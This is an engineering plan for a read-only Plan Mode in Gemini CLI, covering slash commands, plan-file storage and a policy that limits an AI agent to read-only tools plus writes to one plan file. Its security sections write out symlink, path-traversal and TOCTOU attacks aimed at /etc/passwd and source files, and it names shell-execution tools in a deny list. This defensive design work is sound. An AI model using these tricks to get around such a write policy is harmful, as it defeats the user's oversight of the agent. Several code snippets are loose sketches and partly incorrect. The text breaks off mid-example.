# Gemini CLI Plan Mode Implementation Plan

## Goal
Implement a `/plan` command that enables Plan Mode (read-only), supports both chat output and a persistent plan file, and allows all read-only tools while preventing edits outside the plan file.

### Context and Motivation
Plan Mode is designed to separate the planning phase from the implementation phase in software development workflows. This separation provides several key benefits:

1. **Risk Mitigation**: By enforcing read-only operations during planning, we prevent accidental modifications to the codebase while exploring and understanding the system.

2. **Better Design Decisions**: Forcing the AI (and user) to thoroughly explore the codebase before making changes leads to more informed architectural decisions and reduces the likelihood of breaking changes.

3. **Approval-Based Workflow**: The persistent plan file creates a reviewable artifact that can be approved before implementation begins, enabling better collaboration and oversight.

4. **Mental Model Clarity**: Clear separation between "understanding/planning" and "implementing" modes helps both the AI and users maintain focus on the appropriate task at each phase.

## Design summary
Plan Mode in Gemini CLI already exists as an approval mode (`ApprovalMode.PLAN`) with a dedicated policy file (`plan.toml`) and a prompt segment injected during Plan Mode. This existing infrastructure provides:
- A policy enforcement mechanism that restricts tool usage
- A dedicated approval mode that can be toggled via Shift+Tab
- Prompt modifications that guide the AI's behavior during planning

This implementation plan builds on this foundation by:
1. **Adding explicit command-line control** via `/plan` slash command (instead of relying solely on Shift+Tab)
2. **Introducing a persistent plan file** stored in `.gemini/plans/plan.md` that serves as the authoritative planning document
3. **Expanding the tool allowlist** to include all read-only tools (not just a minimal subset)
4. **Creating granular write permissions** that only allow edits to the plan file itself

### Architecture Overview
The Plan Mode implementation spans three layers:

**Storage Layer** (`packages/core/src/config/storage.ts`):
- Determines where plan files should be stored (project-local vs global)
- Provides consistent path resolution across the application
- Handles directory creation and file initialization

**Policy Layer** (`packages/core/src/policy/policies/plan.toml`):
- Enforces read-only constraints via tool allowlist
- Implements path-based access control for the plan file
- Integrates with the existing policy engine for consistent enforcement

**UI Layer** (`packages/cli/src/ui/commands/planCommand.ts`):
- Provides user-facing commands to control Plan Mode
- Displays helpful information about current mode and plan file location
- Manages transitions between approval modes

## Document Navigation

This is a comprehensive implementation plan. Quick navigation:

**Core Design** (read these first):
- [Scope](#scope) - What we're building
- [Implementation Steps](#implementation-steps) - How to build it (6 detailed steps)

**Decision Making**:
- [Open Decisions and Trade-offs](#open-decisions-and-trade-offs) - 7 major decisions explained
- [Acceptance Criteria](#acceptance-criteria) - How we know it's done

**Technical Deep-Dives**:
- [Security Considerations](#security-considerations) - Threat model and mitigations
- [Performance Considerations](#performance-considerations) - Latency targets and optimizations
- [User Experience Considerations](#user-experience-considerations) - Discoverability and onboarding

**Future Work**:
- [Future Enhancements](#future-enhancements) - Phase 2-5 roadmap
- [Migration and Rollout Strategy](#migration-and-rollout-strategy) - How to ship it safely

**Quick Reference**:
- [References](#references) - Code locations and documentation

---

## Scope

### In Scope (This Implementation)
- ✓ Add a new `/plan` slash command with `start`, `status`, and `exit` subcommands
- ✓ Introduce a plan file path (per project when in a repo, global fallback otherwise)
- ✓ Ensure plan directory and file are created on entering Plan Mode
- ✓ Update Plan Mode policy rules to allow all read-only tools
- ✓ Allow `write_file` and `replace_in_file` ONLY for the plan file (path-based access control)
- ✓ Update Plan Mode prompt text to instruct the model on planning workflow
- ✓ Add comprehensive tests for commands, policy, prompts, and storage utilities
- ✓ Document security considerations and threat mitigations

### Out of Scope (Future Enhancements)
- ✗ Multiple named plans (future: `/plan new <name>`)
- ✗ Plan history and archiving (future: `/plan archive`)
- ✗ Plan visualization or checklists (future: `/plan visualize`)
- ✗ Team collaboration features (future: plan approvals, sharing)
- ✗ AI-powered plan validation (future: feasibility checking)
- ✗ Integration with issue trackers (future: GitHub/Jira sync)

## Implementation steps

### 1) Add plan file path utilities (core)

#### Overview
Create utility functions that provide consistent, predictable paths for plan file storage across different project contexts. These utilities form the foundation for all plan file operations.

#### Implementation Details
Add the following helpers in `packages/core/src/config/storage.ts`:

**`getProjectPlansDir(): string | null`**
- Returns: `<project_root>/.gemini/plans` if in a Git repository
- Returns: `null` if not in a Git repository or project root cannot be determined
- Implementation approach:
  - Use existing Git repository detection logic (likely similar to how `.gemini/settings` is found)
  - Ensure the path is absolute to avoid relative path issues
  - Do NOT create the directory in this function (read-only utility)

**`getGlobalPlansDir(): string`**
- Returns: `~/.gemini/plans` (user's home directory)
- Implementation approach:
  - Use `os.homedir()` or equivalent cross-platform home directory resolution
  - Expand `~` properly on all platforms (Windows: `%USERPROFILE%`, Unix: `$HOME`)
  - Return absolute path always

**`getPlanFilePath(): string`**
- Returns: The absolute path to the plan file, preferring project-local over global
- Logic flow:
  ```typescript
  const projectDir = getProjectPlansDir();
  if (projectDir !== null) {
    return path.join(projectDir, 'plan.md');
  }
  return path.join(getGlobalPlansDir(), 'plan.md');
  ```
- This function determines the single authoritative plan file location for the current context

**`ensurePlanFileExists(): string`**
- Creates the plan directory if it doesn't exist
- Creates an empty (or template) `plan.md` file if it doesn't exist
- Returns: The absolute path to the plan file
- Implementation approach:
  ```typescript
  const planPath = getPlanFilePath();
  const planDir = path.dirname(planPath);

  // Create directory with recursive flag
  await fs.mkdir(planDir, { recursive: true });

  // Create empty plan file if it doesn't exist
  if (!await fs.exists(planPath)) {
    const template = `# Implementation Plan\n\nCreated: ${new Date().toISOString()}\n\n## Overview\n\n## Steps\n\n`;
    await fs.writeFile(planPath, template, 'utf8');
  }

  return planPath;
  ```

#### Rationale and Design Decisions

**Why `.gemini/plans` directory?**
- Consistency with existing `.gemini/` patterns (settings, history, etc.)
- Hidden directory (`.` prefix) keeps project root clean
- Subdirectory allows for future expansion (multiple plan files, plan history, etc.)
- Aligns with convention used by other development tools (`.vscode/`, `.github/`, etc.)

**Why project-local first, global fallback?**
- **Project context is primary**: Most planning work is project-specific
- **Global fallback for scratch work**: Allows planning outside of Git repositories (e.g., quick experiments, system scripts)
- **No ambiguity**: Single authoritative plan file per context
- **Prevents pollution**: Global plans don't clutter project-specific plans

**Why fixed filename `plan.md`?**
- **Simplicity**: Users always know where to find the plan
- **Editor integration**: Can easily open `.gemini/plans/plan.md` in IDE
- **No decision fatigue**: No need to name each plan
- **Future extensibility**: Can add `plan-backup-{timestamp}.md` or `plan-history/` later without breaking current implementation

#### Edge Cases and Error Handling

1. **Permission denied creating directory**:
   - Catch EACCES/EPERM errors
   - Fall back to global directory if project directory creation fails
   - Log warning to user

2. **Disk full**:
   - Catch ENOSPC errors
   - Display user-friendly error message
   - Don't enter Plan Mode if file can't be created

3. **Path too long (Windows)**:
   - Windows has 260 character path limit (MAX_PATH)
   - Use `\\?\` prefix for long paths on Windows
   - Or catch ENAMETOOLONG and warn user

4. **Concurrent access**:
   - Multiple Gemini CLI instances could access same plan file
   - File system operations should be atomic where possible
   - Document that plan file should be edited by one instance at a time

#### Testing Strategy
- Unit tests for each utility function
- Test project-local path resolution with mock Git repo
- Test global fallback when not in Git repo
- Test directory creation and template generation
- Test path resolution on Windows (backslashes) and Unix (forward slashes)
- Test home directory expansion (`~` -> absolute path)
- Mock file system errors and verify graceful fallback

### 2) Add `/plan` slash command (CLI)

#### Overview
Create a user-facing command interface that provides explicit, discoverable control over Plan Mode. While Shift+Tab provides quick toggling, a command-based interface offers better discoverability, scriptability, and informational feedback.

#### Implementation Details

Create `packages/cli/src/ui/commands/planCommand.ts` following the established slash command pattern:

**Command Structure**
```typescript
// Command registration
{
  name: 'plan',
  description: 'Enter or exit Plan Mode for read-only exploration and planning',
  subcommands: ['start', 'status', 'exit'],
  handler: handlePlanCommand
}
```

**Subcommand: `/plan start`**

Purpose: Enter Plan Mode and initialize plan file

Logic flow:
```typescript
async function handlePlanStart(context: CommandContext) {
  // 1. Feature gate check
  if (!context.config.experimental?.planMode) {
    return {
      message: 'Plan Mode is experimental. Enable it in settings with `/settings experimental.planMode true`',
      error: true
    };
  }

  // 2. Check if already in Plan Mode
  if (context.approvalMode === ApprovalMode.PLAN) {
    return {
      message: `Already in Plan Mode. Plan file: ${getPlanFilePath()}`,
      error: false
    };
  }

  // 3. Create plan file and directory
  try {
    const planPath = await ensurePlanFileExists();

    // 4. Switch to Plan Mode
    context.setApprovalMode(ApprovalMode.PLAN);

    // 5. Provide user feedback
    return {
      message: [
        '✓ Entered Plan Mode (read-only)',
        `📝 Plan file: ${planPath}`,
        '',
        'In Plan Mode, you can:',
        '  • Use all read-only tools to explore the codebase',
        '  • Write to the plan file to document your planning',
        '  • Ask questions and gather information',
        '',
        'You cannot:',
        '  • Edit source code files',
        '  • Execute shell commands',
        '  • Make any changes outside the plan file',
        '',
        'Exit Plan Mode with `/plan exit` or Shift+Tab when ready to implement.'
      ].join('\n'),
      error: false
    };
  } catch (err) {
    return {
      message: `Failed to create plan file: ${err.message}`,
      error: true
    };
  }
}
```

**Subcommand: `/plan status`**

Purpose: Show current Plan Mode status and plan file location

Logic flow:
```typescript
async function handlePlanStatus(context: CommandContext) {
  const isInPlanMode = context.approvalMode === ApprovalMode.PLAN;
  const planPath = getPlanFilePath();
  const planExists = await fileExists(planPath);

  const status = [
    `Current Mode: ${isInPlanMode ? '📋 Plan Mode (read-only)' : '⚙️  Build Mode'}`,
    `Plan File: ${planPath}`,
    `  Status: ${planExists ? '✓ Exists' : '✗ Not created yet'}`,
  ];

  if (planExists) {
    const stats = await fs.stat(planPath);
    status.push(`  Modified: ${stats.mtime.toLocaleString()}`);
    status.push(`  Size: ${formatBytes(stats.size)}`);
  }

  if (!isInPlanMode && planExists) {
    status.push('');
    status.push('💡 Tip: Enter Plan Mode with `/plan start` to continue planning');
  }

  return {
    message: status.join('\n'),
    error: false
  };
}
```

**Subcommand: `/plan exit`**

Purpose: Exit Plan Mode and return to default/build mode

Logic flow:
```typescript
async function handlePlanExit(context: CommandContext) {
  // 1. Check if in Plan Mode
  if (context.approvalMode !== ApprovalMode.PLAN) {
    return {
      message: 'Not currently in Plan Mode',
      error: false
    };
  }

  // 2. Determine target mode
  // Option A: Always return to DEFAULT
  const targetMode = ApprovalMode.DEFAULT;

  // Option B: Return to previous mode (requires state tracking)
  // const targetMode = context.previousApprovalMode || ApprovalMode.DEFAULT;

  // Option C: Smart detection based on plan file content
  // If plan looks complete, suggest AUTO_EDIT; otherwise DEFAULT

  // 3. Exit Plan Mode
  context.setApprovalMode(targetMode);

  // 4. Provide user feedback
  const planPath = getPlanFilePath();
  const planExists = await fileExists(planPath);

  const messages = [
    '✓ Exited Plan Mode',
    `Current Mode: ${getModeName(targetMode)}`,
  ];

  if (planExists) {
    messages.push('');
    messages.push(`📝 Your plan is saved at: ${planPath}`);
    messages.push('💡 Tip: You can reference this plan file as you implement');
  }

  return {
    message: messages.join('\n'),
    error: false
  };
}
```

**Command Registration**

Add to command registry (e.g., `packages/cli/src/ui/commands/index.ts`):
```typescript
import { planCommand } from './planCommand';

export const SLASH_COMMANDS = [
  // ... existing commands
  planCommand,
];
```

Ensure help text includes the new command:
```
/plan start   - Enter Plan Mode (read-only exploration)
/plan status  - Show current mode and plan file location
/plan exit    - Exit Plan Mode and return to build mode
```

#### Rationale and Design Decisions

**Why explicit `/plan` command instead of only Shift+Tab?**
- **Discoverability**: New users can find the command via `/help` or autocomplete
- **Clarity**: Explicit command communicates intent better than a keyboard shortcut
- **Scriptability**: Can be used in automation or saved command sequences
- **Documentation**: Easier to document and teach than "press Shift+Tab"
- **Accessibility**: Not all terminal emulators properly support Shift+Tab
- **Still keep Shift+Tab**: Power users benefit from quick toggle; both approaches coexist

**Why subcommands instead of separate commands?**
- **Logical grouping**: `/plan start`, `/plan exit`, `/plan status` clearly relate to Plan Mode
- **Namespace management**: Avoids polluting global command namespace
- **Consistency**: Matches patterns like `/settings get`, `/agents list`, etc.
- **Extensibility**: Easy to add `/plan history`, `/plan clear`, etc. later

**Why show detailed feedback messages?**
- **Learning aid**: Explains what Plan Mode does and doesn't allow
- **Confidence**: Users know exactly what state they're in
- **Guidance**: Suggests next actions (how to exit, where the plan file is)
- **Troubleshooting**: If something seems wrong, status message provides diagnostic info

**Why feature gate check?**
- **Experimental safety**: Plan Mode may have rough edges; opt-in reduces unexpected behavior
- **Gradual rollout**: Can test with early adopters before general availability
- **Clear upgrade path**: When stabilized, remove feature gate in major version

#### User Experience Flow

**Typical workflow:**
```
User: /plan start
CLI:  ✓ Entered Plan Mode (read-only)
      📝 Plan file: /project/.gemini/plans/plan.md
      [... help text ...]

User: Please explore the authentication system and create a plan for adding OAuth support

AI:   [Explores codebase using read-only tools, writes detailed plan to plan.md]

User: /plan status
CLI:  Current Mode: 📋 Plan Mode (read-only)
      Plan File: /project/.gemini/plans/plan.md
        Status: ✓ Exists
        Modified: 2024-01-24 14:30:22
        Size: 4.2 KB

User: /plan exit
CLI:  ✓ Exited Plan Mode
      Current Mode: ⚙️  Default Mode
      📝 Your plan is saved at: /project/.gemini/plans/plan.md
```

#### Edge Cases and Error Handling

1. **Feature not enabled**:
   - Check `config.experimental.planMode` flag
   - Show clear error with instructions to enable
   - Don't silently fail

2. **Already in Plan Mode**:
   - `/plan start` is idempotent
   - Show current status instead of error
   - Helpful for users who forget current state

3. **Plan file creation fails**:
   - Catch file system errors
   - Show actionable error message
   - Don't enter Plan Mode if setup fails

4. **Not in Plan Mode when exiting**:
   - `/plan exit` when not in Plan Mode is not an error
   - Just confirm current mode
   - Helpful for automation scripts

5. **Rapid mode switching**:
   - Multiple `/plan start` + `/plan exit` cycles
   - Ensure state consistency
   - No file corruption or stale state

#### Testing Strategy
- **Unit tests** for each subcommand handler
- **Integration tests** for command registration and routing
- **E2E tests** for complete workflows:
  - Start → explore → status → exit
  - Start when already started (idempotent)
  - Exit when not started (safe no-op)
  - Start with feature disabled (clear error)
- **Error scenario tests**:
  - File system errors during plan creation
  - Permission denied on directory creation
  - Disk full scenarios
- **Cross-platform tests**:
  - Path formatting on Windows vs Unix
  - Home directory resolution
  - Unicode in file paths

### 3) Expand Plan Mode tool allowlist (policy + prompt)

#### Overview
Broaden the set of allowed tools in Plan Mode from a minimal restrictive set to all read-only tools. This enables comprehensive codebase exploration while maintaining the safety guarantee that no modifications can occur.

#### Current State Analysis

**Existing Plan Mode restrictions** (assumed from `plan.toml`):
- Currently allows: `read_file`, `list_directory`, `glob_search`, `ripgrep_search`
- Currently denies: All write/edit/execute tools
- Problem: Too restrictive for thorough planning
  - Can't fetch documentation via `web_fetch`
  - Can't read multiple files efficiently with `read_many_files`
  - Can't access internal tool docs with `get_internal_docs`
  - Can't use advanced search or analysis tools

**Goal**: Allow ALL read-only tools while still preventing any modifications

#### Implementation Details

**Update `packages/core/src/policy/policies/plan.toml`**

Define comprehensive read-only tool allowlist:

```toml
# Plan Mode Policy
# Allows all read-only tools for comprehensive exploration
# Denies all write/execute tools except plan file edits

[plan_mode]
description = "Read-only mode for safe codebase exploration and planning"

# ===== ALLOWED: All read-only tools =====

[[plan_mode.rules]]
effect = "allow"
tools = [
  # File reading
  "read_file",
  "read_many_files",

  # Directory and search
  "list_directory",
  "glob_search",
  "ripgrep_search",
  "search_symbol",
  "find_definition",

  # Documentation and information
  "web_fetch",            # Fetch external documentation
  "web_search",           # Search for information
  "get_internal_docs",    # Access tool documentation
  "show_help",

  # Code intelligence (LSP-based)
  "get_hover_info",
  "find_references",
  "get_type_info",
  "list_symbols",

  # Git information (read-only)
  "git_log",
  "git_diff",
  "git_show",
  "git_status",
  "git_blame",

  # Other read-only utilities
  "calculate",
  "get_current_time",
  "check_file_exists",
]
description = "Allow all read-only tools for comprehensive exploration"

# ===== DENIED: All modification tools (by default) =====

[[plan_mode.rules]]
effect = "deny"
tools = [
  # File modifications
  "write_file",
  "replace_in_file",
  "edit_file",
  "delete_file",
  "create_directory",
  "move_file",
  "copy_file",

  # Code execution
  "execute_shell",
  "run_command",
  "python_eval",
  "javascript_eval",

  # Git modifications
  "git_commit",
  "git_push",
  "git_checkout",
  "git_merge",
  "git_rebase",
  "git_reset",
  "git_stash",

  # Other dangerous operations
  "install_package",
  "network_request",   # POST/PUT/DELETE requests
]
description = "Deny all tools that can modify state"

# ===== EXCEPTION: Allow plan file edits =====
# This rule is more specific and overrides the deny rule above
# See step 4 for detailed implementation
```

**Update `packages/core/src/tools/tool-names.ts`**

Ensure the TypeScript constant matches the TOML policy:

```typescript
// Read-only tools allowed in Plan Mode
export const PLAN_MODE_ALLOWED_TOOLS = [
  // File reading
  'read_file',
  'read_many_files',

  // Directory and search
  'list_directory',
  'glob_search',
  'ripgrep_search',
  'search_symbol',
  'find_definition',

  // Documentation and information
  'web_fetch',
  'web_search',
  'get_internal_docs',
  'show_help',

  // Code intelligence
  'get_hover_info',
  'find_references',
  'get_type_info',
  'list_symbols',

  // Git information (read-only)
  'git_log',
  'git_diff',
  'git_show',
  'git_status',
  'git_blame',

  // Other utilities
  'calculate',
  'get_current_time',
  'check_file_exists',
] as const;

// Type for allowed tools
export type PlanModeAllowedTool = typeof PLAN_MODE_ALLOWED_TOOLS[number];

// Validation helper
export function isPlanModeAllowedTool(toolName: string): toolName is PlanModeAllowedTool {
  return PLAN_MODE_ALLOWED_TOOLS.includes(toolName as any);
}
```

**Sync mechanism to prevent drift**

Add a test that validates TOML and TypeScript are in sync:

```typescript
// packages/core/src/policy/plan-mode-tools.test.ts
import { describe, test, expect } from 'vitest';
import { PLAN_MODE_ALLOWED_TOOLS } from '../tools/tool-names';
import { parsePlanPolicy } from './policies/plan.toml';

describe('Plan Mode tool allowlist sync', () => {
  test('TOML policy matches TypeScript constant', () => {
    const tomlAllowedTools = parsePlanPolicy().allowedTools;
    const tsAllowedTools = new Set(PLAN_MODE_ALLOWED_TOOLS);

    // Ensure TOML and TS define the same set
    expect(new Set(tomlAllowedTools)).toEqual(tsAllowedTools);
  });

  test('All allowed tools are read-only', () => {
    // This test encodes the invariant that Plan Mode should never
    // allow write operations
    const dangerousTools = [
      'write_file', 'execute_shell', 'git_commit', 'delete_file'
    ];

    for (const tool of PLAN_MODE_ALLOWED_TOOLS) {
      expect(dangerousTools).not.toContain(tool);
    }
  });
});
```

#### Rationale and Design Decisions

**Why allow all read-only tools instead of a minimal set?**
- **Thorough exploration**: Planning requires comprehensive understanding
  - Need to fetch external API docs (`web_fetch`)
  - Need to search Stack Overflow for implementation patterns (`web_search`)
  - Need to check multiple related files efficiently (`read_many_files`)
  - Need to understand git history and blame (`git_log`, `git_blame`)

- **No additional risk**: Read-only tools cannot corrupt the codebase
  - Even if AI makes mistakes in exploration, no damage occurs
  - Worst case: AI reads irrelevant files (wastes time, not dangerous)

- **Better plans**: More information → better architectural decisions
  - Understanding existing patterns requires reading many files
  - External documentation provides implementation guidance
  - Code intelligence (LSP) reveals type information and dependencies

**Why maintain both TOML and TypeScript lists?**
- **TOML (plan.toml)**: Runtime policy enforcement
  - Policy engine reads TOML to allow/deny tool calls
  - Single source of truth for security decisions

- **TypeScript (tool-names.ts)**: Compile-time type safety and UI hints
  - Type checking ensures code uses correct tool names
  - UI can show "Available in Plan Mode" badges
  - Autocomplete can suggest allowed tools

- **Sync test**: Prevents drift between the two sources
  - Ensures runtime policy matches compile-time expectations
  - CI fails if they get out of sync

**Why explicit deny list when we have allow list?**
- **Defense in depth**: Explicit deny catches new tools added later
- **Documentation**: Makes dangerous operations obvious
- **Fail-safe**: If policy engine has bugs, explicit deny provides fallback

**Why categorize tools in comments?**
- **Maintenance**: Easy to see coverage of each category
- **Review**: When adding new tools, clear where they belong
- **Documentation**: Serves as inline explanation of each tool's purpose

#### Security Considerations

**Principle: Read-only ≠ Harmless**

While read-only tools can't corrupt the codebase, they can still:
1. **Leak sensitive information**: Reading `.env` files, API keys, credentials
2. **Exfiltrate data**: `web_fetch` could POST data to external servers
3. **Consume resources**: Recursive directory reads could freeze the system
4. **Privacy concerns**: Reading git history might expose personal information

**Mitigations**:
1. **User awareness**: Plan Mode documentation should warn about sensitive files
2. **Future enhancement**: Add path blocklist for common secret locations (`.env`, `credentials.json`, etc.)
3. **Audit logging**: Log all tool calls during Plan Mode for security review
4. **Rate limiting**: Prevent runaway exploration (e.g., 1000+ file reads)

**Web access tools (`web_fetch`, `web_search`)**:
- **Pros**: Essential for fetching documentation, searching solutions
- **Cons**: Could be used for data exfiltration or command-and-control
- **Decision**: Allow, but document that Plan Mode has internet access
- **Future**: Add domain allowlist/blocklist configuration

**Git read tools**:
- **Safe**: `git_log`, `git_diff`, `git_show`, `git_status`, `git_blame`
- **Unsafe**: `git_commit`, `git_push`, `git_checkout` (all denied)
- **Edge case**: `git_stash` appears "read-only" but modifies working directory (correctly denied)

#### Impact on AI Behavior

**Before (restrictive allowlist)**:
```
User: "Plan how to add OAuth support"
AI: "I can only read individual files. Let me read auth.ts... [reads one file]"
     "I cannot search the codebase or fetch OAuth documentation. My plan is limited."
```

**After (comprehensive allowlist)**:
```
User: "Plan how to add OAuth support"
AI: [Uses ripgrep_search to find all authentication code]
    [Uses web_fetch to read OAuth 2.0 spec]
    [Uses read_many_files to read related files]
    [Uses git_blame to understand why current auth was designed this way]
    [Writes comprehensive plan with architectural context]
```

The expanded allowlist transforms Plan Mode from a hobbled exploration mode into a powerful planning environment.

#### Testing Strategy

**Unit tests**:
- Policy engine correctly allows each tool in the allowlist
- Policy engine correctly denies each tool in the denylist
- Path-specific rules (plan file exception) work correctly

**Integration tests**:
- AI can successfully use all allowed tools during Plan Mode
- AI receives clear error when attempting denied tools
- Tool responses are correctly formatted and useful

**Sync tests**:
- TOML and TypeScript lists match exactly
- No dangerous tools slip into allowlist
- New tools added to codebase are explicitly categorized

**Security tests**:
- Attempt to bypass policy with tool name variations
- Verify deny list takes precedence over allow list for overlaps
- Ensure policy engine fails closed (deny by default) on unknown tools

### 4) Allow plan file edits only

#### Overview
Create a path-based exception to the "deny all writes" policy that permits editing exclusively the plan file. This enables the AI to maintain a structured, persistent plan document while preventing any modifications to source code.

#### The Core Challenge

**Problem**: We want Plan Mode to be read-only, but we also need the AI to write the plan somewhere.

**Options considered**:
1. **Chat-only output**: AI writes plan in chat messages
   - ❌ Not persistent: plan lost when chat scrolls or session ends
   - ❌ Not editable: can't refine plan iteratively
   - ❌ Not shareable: hard to extract and share with team

2. **Allow all writes**: Remove write restrictions during planning
   - ❌ Defeats the purpose: AI could accidentally modify source code
   - ❌ No safety: user could lose work if AI makes mistakes

3. **Special plan-writing tool**: Create `write_plan` tool separate from `write_file`
   - ✓ Clear separation of concerns
   - ❌ More code to maintain (new tool, new handlers)
   - ❌ Model needs to learn different tool for plan vs code writing

4. **Path-based exception** (chosen): Allow `write_file` only for plan file path
   - ✓ Reuses existing tools (write_file, replace_in_file)
   - ✓ Clear safety boundary (path-based access control)
   - ✓ Model uses familiar tools
   - ✓ Minimal code changes (just policy rules)

#### Implementation Details

**Update `packages/core/src/policy/policies/plan.toml`**

Add path-specific allow rule AFTER the general deny rule:

```toml
# ===== DENIED: All modification tools (general rule) =====
[[plan_mode.rules]]
effect = "deny"
tools = ["write_file", "replace_in_file", "edit_file", "delete_file", ...]
description = "Deny all file modifications by default"

# ===== EXCEPTION: Allow plan file edits only =====
# This rule is more specific than the deny rule above and takes precedence
[[plan_mode.rules]]
effect = "allow"
tools = ["write_file", "replace_in_file"]
path_patterns = [
  "**/.gemini/plans/plan.md",        # Project-local plan file
  "~/.gemini/plans/plan.md",         # Global plan file
]
description = "Allow writing only to the plan file"
priority = 10  # Higher priority than deny rule

# Implementation notes:
# - path_patterns use glob syntax
# - ** matches any number of directories
# - ~ expands to user home directory
# - Paths are normalized before matching (resolve symlinks, "..", etc.)
```

**Path Matching Logic**

Implement in policy engine (`packages/core/src/policy/engine.ts`):

```typescript
interface PolicyRule {
  effect: 'allow' | 'deny';
  tools: string[];
  path_patterns?: string[];
  priority?: number;
}

function evaluatePolicy(
  toolName: string,
  args: ToolArgs,
  mode: ApprovalMode,
  rules: PolicyRule[]
): 'allow' | 'deny' {
  // Get file path from tool arguments
  const targetPath = extractFilePath(toolName, args);

  // Filter rules that apply to this tool
  const applicableRules = rules.filter(rule =>
    rule.tools.includes(toolName)
  );

  // Sort by priority (higher first), then deny before allow
  applicableRules.sort((a, b) => {
    if (a.priority !== b.priority) {
      return (b.priority || 0) - (a.priority || 0);
    }
    return a.effect === 'deny' ? -1 : 1;
  });

  // Evaluate rules in priority order
  for (const rule of applicableRules) {
    // If rule has path patterns, check if target path matches
    if (rule.path_patterns) {
      const matches = rule.path_patterns.some(pattern =>
        matchesPathPattern(targetPath, pattern)
      );
      if (!matches) continue; // Rule doesn't apply to this path
    }

    // Rule applies: return its effect
    return rule.effect;
  }

  // No matching rule: deny by default (fail closed)
  return 'deny';
}

function matchesPathPattern(filePath: string, pattern: string): boolean {
  // Normalize paths to absolute, resolve symlinks
  const normalizedPath = path.resolve(fs.realpathSync(filePath));

  // Expand ~ in pattern to home directory
  const expandedPattern = pattern.replace(/^~/, os.homedir());

  // Convert glob pattern to regex (using minimatch or similar)
  const matcher = new Minimatch(expandedPattern);

  return matcher.match(normalizedPath);
}

function extractFilePath(toolName: string, args: ToolArgs): string | null {
  // Extract file path from different tool argument structures
  switch (toolName) {
    case 'write_file':
      return args.file_path || args.path;
    case 'replace_in_file':
      return args.file_path;
    case 'edit_file':
      return args.file;
    default:
      return null;
  }
}
```

**Edge Case: Path Normalization**

Critical for security - attacker shouldn't bypass policy via path tricks:

```typescript
// All of these should be recognized as the same file:
// - /project/.gemini/plans/plan.md
// - /project/.gemini/plans/../plans/plan.md
// - /project/.gemini/plans/./plan.md
// - /project/subdir/../.gemini/plans/plan.md
// - /project/.gemini/plans/plan.md (if /project is symlink to /real/project)

function normalizePathForPolicy(filePath: string): string {
  // 1. Resolve to absolute path
  let normalized = path.resolve(filePath);

  // 2. Resolve symlinks (so symlink attacks don't work)
  try {
    normalized = fs.realpathSync(normalized);
  } catch (err) {
    // File doesn't exist yet - that's okay for write operations
    // Just resolve the parent directory
    const dir = path.dirname(normalized);
    const base = path.basename(normalized);
    try {
      const realDir = fs.realpathSync(dir);
      normalized = path.join(realDir, base);
    } catch {
      // Parent doesn't exist either - use as-is
    }
  }

  // 3. Normalize path separators (Windows vs Unix)
  normalized = normalized.split(path.sep).join('/');

  return normalized;
}
```

#### Rationale and Design Decisions

**Why path-based access control?**
- **Granular**: Can allow specific files without allowing all files
- **Flexible**: Easy to extend (e.g., allow `.gemini/plans/*.md` for multiple plan files)
- **Standard**: Path-based ACLs are a proven security model (Unix permissions, file system ACLs, etc.)
- **Auditable**: Policy clearly states which paths are writeable

**Why allow both `write_file` and `replace_in_file`?**
- **Initial creation**: `write_file` creates the plan from scratch
- **Iterative refinement**: `replace_in_file` updates specific sections
- **Complete rewrites**: `write_file` can overwrite the entire plan if needed
- **AI flexibility**: Model can choose appropriate tool for the task

**Why not allow `edit_file`?**
- Depends on implementation: if `edit_file` is like `replace_in_file`, should be allowed
- If `edit_file` is more dangerous (e.g., runs external editor), keep denied
- Decision: Audit what `edit_file` does, then add if safe

**Why both project and global plan paths?**
- **Context switching**: User might plan in project, then plan globally
- **Consistency**: Wherever `getPlanFilePath()` returns, AI can write there
- **No confusion**: AI doesn't need to know context (policy engine handles it)

**Why use glob patterns instead of exact paths?**
- **Portability**: `**/.gemini/plans/plan.md` matches any project
- **Flexibility**: Can allow `**/.gemini/plans/*.md` for multiple plans later
- **Conciseness**: One pattern instead of listing every possible project path

#### Security Considerations

**Symlink Attacks**

Attacker tries to bypass policy by creating a symlink:

```bash
# Attacker's attempt:
ln -s /etc/passwd .gemini/plans/plan.md

# Without normalization:
# - AI writes to ".gemini/plans/plan.md"
# - Actually writes to "/etc/passwd" (BAD!)

# With normalization:
# - ".gemini/plans/plan.md" resolves to "/etc/passwd"
# - "/etc/passwd" doesn't match "**/.gemini/plans/plan.md"
# - Write is denied (GOOD!)
```

**Path Traversal Attacks**

Attacker tries to use `..` to escape:

```bash
# Attacker's attempt: write to source code via path traversal
write_file(.gemini/plans/../../src/index.ts)

# Without normalization:
# - Path: ".gemini/plans/../../src/index.ts"
# - Looks different from plan path, but resolves to "src/index.ts"

# With normalization:
# - ".gemini/plans/../../src/index.ts" → "/project/src/index.ts"
# - "/project/src/index.ts" doesn't match "**/.gemini/plans/plan.md"
# - Write is denied (GOOD!)
```

**Case Sensitivity**

On case-insensitive file systems (macOS, Windows):

```typescript
// These should all be recognized as the plan file:
// - .gemini/plans/plan.md
// - .GEMINI/PLANS/PLAN.MD
// - .Gemini/Plans/Plan.Md

function matchesPathPattern(filePath: string, pattern: string): boolean {
  // Check if file system is case-insensitive
  const isCaseInsensitive = os.platform() === 'darwin' || os.platform() === 'win32';

  if (isCaseInsensitive) {
    filePath = filePath.toLowerCase();
    pattern = pattern.toLowerCase();
  }

  return minimatch(filePath, pattern);
}
```

**Race Conditions**

AI might try to write to plan file while it's being moved:

```typescript
// Time-of-check-to-time-of-use (TOCTOU) vulnerability:
// 1. Policy engine checks: ".gemini/plans/plan.md" matches pattern ✓
// 2. Attacker renames: mv .gemini/plans/plan.md .gemini/plans/evil.md
// 3. Attacker symlinks: ln -s /etc/passwd .gemini/plans/plan.md
// 4. Write happens: writes to /etc/passwd (BAD!)

// Mitigation: Open file with O_NOFOLLOW flag (don't follow symlinks)
const fd = fs.openSync(filePath, 'w', { flag: 'O_NOFOLLOW' });
```

#### Impact on AI Behavior

The AI's workflow in Plan Mode becomes:

1. **Explore codebase**: Use read-only tools (glob, ripgrep, read_file, etc.)
2. **Gather information**: Fetch docs with web_fetch, search with web_search
3. **Draft plan**: Write to plan file with write_file
4. **Refine plan**: Update specific sections with replace_in_file
5. **Summarize in chat**: Provide high-level overview for user
6. **Iterate**: User asks questions, AI refines plan

**Example interaction**:

```
User: "Plan how to add Redis caching to the API"

AI: I'll explore your API architecture and create a plan for adding Redis caching.

   [Uses ripgrep_search to find API endpoints]
   [Uses read_file to understand current data flow]
   [Uses web_fetch to read Redis documentation]

